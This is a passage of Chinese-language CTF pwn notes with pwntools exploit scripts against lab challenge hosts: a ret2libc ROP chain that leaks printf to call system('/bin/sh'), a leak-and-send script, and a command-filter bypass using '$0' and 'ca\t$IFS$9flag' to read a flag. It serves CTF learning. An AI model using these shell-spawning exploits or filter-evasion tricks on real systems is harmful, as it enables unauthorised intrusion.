io.send(payload)
log.info("Payload sent, now sending /bin/sh...")
io.send(b"/bin/sh\x00")
log.info("Sent second input, now switching to interactive")
io.interactive()

io.interactive()
```

# u64
```python
from pwn import *

#p = process('./u64')   
p = remote('192.168.202.1',32409)  

elf = ELF('./u64')

p.recvuntil(b"Here is the hint.")
leak = p.recvn(8) 
num = u64(leak)  

log.success(f"Leaked num: {num}")
p.recvuntil(b">")
p.sendline(str(num).encode())

p.interactive()
```

# 认识libc
不知道为什么本地打不通，远程能打通。接收printf的地址有问题

```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug') 

#p=process('./pre_libc')
e =ELF("./pre_libc")
libc = ELF("libc.so.6")
p=remote('192.168.202.1',15964)

p.recvuntil(b"location of 'printf': ")  
printf_addr=int(p.recv(14),16)
log.success(f"printf @ {hex(printf_addr)}")

ret=0x000000000040101a
libc_base = printf_addr - libc.symbols['printf']
pop_rdi_ret = libc_base + 0x2a3e5
system= libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b"/bin/sh"))  

payload=b'A'*0x48
payload+=p64(ret)
payload+=p64(pop_rdi_ret)
payload+=p64(binsh)
payload+=p64(system)

#p.recvuntil(b">") 
p.sendline(payload)
p.interactive()
```

# litctf
## nc

![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530692554-0e40cac5-1510-4ae6-b27d-78000fb7e6fe.png)

禁用了黑名单里

这个题想起来刚开始学pwn的时候那个视频里有一个例题

刚好限制了cat的读取,说要用斜杠ca\t来绕过过滤

https://www.bilibili.com/video/BV1Ja4y1u7h3/?spm_id_from=333.1387.upload.video_card.click&vd_source=1fb0c97000e2d50f993f94e726040b6f

那会问完才想起来自己以前见过这种。

当时还没清楚要先发sh拿到控制权。就直接ca\t 来绕过过滤

一些常见

$0 是sh $IFS$9 是空格

https://zhuanlan.zhihu.com/p/391439312

这道题

```plain
$0
ca\t$IFS$9flag
```

就可以

## shellcode
轩辕杯那个shellcode没有写。好像和这个差不多？

叫shellcode里面都有沙箱。

我感觉这种题是要用shellcode把绕过的沙箱写出来


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530692523-ffed45ba-f51c-4687-9a8d-a04833d8abf4.png)

想着应该爆破。爆破还没学。先到这

[沙箱没总结完，就基本没写](https://hnusec-star.feishu.cn/wiki/ZZPYwEcXTiZLBpkgPdYcVQGYn7f)